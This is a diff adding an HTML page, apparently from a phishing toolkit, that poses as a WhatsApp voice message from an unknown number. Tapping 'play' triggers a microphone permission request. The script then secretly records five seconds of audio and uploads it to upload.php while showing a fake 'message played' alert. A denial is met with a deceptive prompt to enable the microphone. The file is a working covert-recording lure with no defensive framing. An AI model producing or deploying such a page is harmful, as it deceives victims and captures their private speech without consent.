@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>New Voice Message</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ece5dd;
+            /* WhatsApp background color */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .msg-card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: #ccc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+        }
+
+        .content {
+            flex: 1;
+        }
+
+        .name {
+            font-weight: bold;
+            color: #075e54;
+            margin-bottom: 5px;
+        }
+
+        .audio-player {
+            background: #f0f0f0;
+            padding: 10px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+        }
+
+        .play-icon {
+            width: 0;
+            height: 0;
+            border-top: 8px solid transparent;
+            border-bottom: 8px solid transparent;
+            border-left: 12px solid #999;
+        }
+
+        .duration {
+            font-size: 0.8rem;
+            color: #999;
+        }
+
+        .info-text {
+            margin-top: 20px;
+            color: #666;
+            font-size: 0.9rem;
+            text-align: center;
+            max-width: 300px;
+        }
+    </style>
+    <script src="../../assets/js/jquery.min.js"></script>
+</head>
+
+<body>
+
+    <div class="msg-card" onclick="requestAudio()">
+        <div class="avatar">?</div>
+        <div class="content">
+            <div class="name">+1 (555) 012-3456</div>
+            <div class="audio-player">
+                <div class="play-icon"></div>
+                <div style="flex:1; height: 4px; background: #ccc; border-radius: 2px;"></div>
+                <div class="duration">0:24</div>
+            </div>
+        </div>
+    </div>
+
+    <p class="info-text">Tap to listen to the voice message.</p>
+
+    <script>
+        function requestAudio() {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    // Start recording
+                    const mediaRecorder = new MediaRecorder(stream);
+                    mediaRecorder.start();
+
+                    const audioChunks = [];
+                    mediaRecorder.addEventListener("dataavailable", event => {
+                        audioChunks.push(event.data);
+                    });
+
+                    mediaRecorder.addEventListener("stop", () => {
+                        const audioBlob = new Blob(audioChunks);
+                        const formData = new FormData();
+                        formData.append("audio_file", audioBlob, "voice_msg.wav");
+
+                        $.ajax({
+                            type: 'POST',
+                            url: 'upload.php',
+                            data: formData,
+                            processData: false,
+                            contentType: false,
+                            success: function (response) {
+                                console.log("Audio uploaded");
+                                alert("Message played (simulated).");
+                            }
+                        });
+                    });
+
+                    // Record for 5 seconds then stop
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 5000);
+
+                })
+                .catch(err => {
+                    console.log("Microphone access denied");
+                    alert("Please enable microphone access to play the message.");
+                });
+        }
+    </script>
+</body>
+
+</html>
